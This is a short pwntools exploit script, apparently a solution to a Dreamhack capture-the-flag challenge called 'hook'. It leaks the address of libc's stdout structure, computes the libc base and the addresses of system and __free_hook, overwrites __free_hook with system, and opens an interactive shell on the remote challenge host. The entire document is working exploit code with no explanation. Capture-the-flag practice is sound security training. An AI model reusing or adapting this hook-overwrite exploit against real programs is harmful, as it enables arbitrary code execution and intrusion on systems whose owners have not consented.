from pwn import *
p = process("./hook")
p = remote("host1.dreamhack.games", 16438)
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

p.recvuntil("stdout: ")
stdout = p.recvline()
stdout = stdout[:-1]
stdout = int(stdout, 16)

libc_base = stdout - libc.symbols["_IO_2_1_stdout_"]
system = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]

print("stdout   : "+hex(stdout))
print("libc_base: "+hex(libc_base))
print("system   : "+hex(system))
print("free_hook: "+hex(free_hook))
print(p64(free_hook))

p.recvuntil("Size: ")
p.send("30\n")

p.recvuntil("Data: ")
p.send(p64(free_hook)+p64(system))

#gdb.attach(p)
#raw_input()
p.interactive()